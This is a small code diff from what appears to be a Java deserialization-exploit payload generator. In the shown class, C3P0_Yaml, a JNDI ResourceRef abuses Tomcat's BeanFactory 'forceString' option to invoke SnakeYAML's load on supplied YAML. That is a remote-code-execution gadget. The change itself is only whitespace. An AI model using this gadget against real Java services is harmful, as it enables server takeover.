@@ -77,7 +77,7 @@ public class C3P0_Yaml implements ObjectPayload<Object> {
             String s = RanDomUtils.generateRandomString(3);
             ResourceRef ref = new ResourceRef("org.yaml.snakeyaml.Yaml", null, "", "",
                     true, "org.apache.naming.factory.BeanFactory", null);
-            ref.add(new StringRefAddr("forceString", s+"=load"));
+            ref.add(new StringRefAddr("forceString", s + "=load"));
             ref.add(new StringRefAddr(s, yaml));
             return ref;
         }
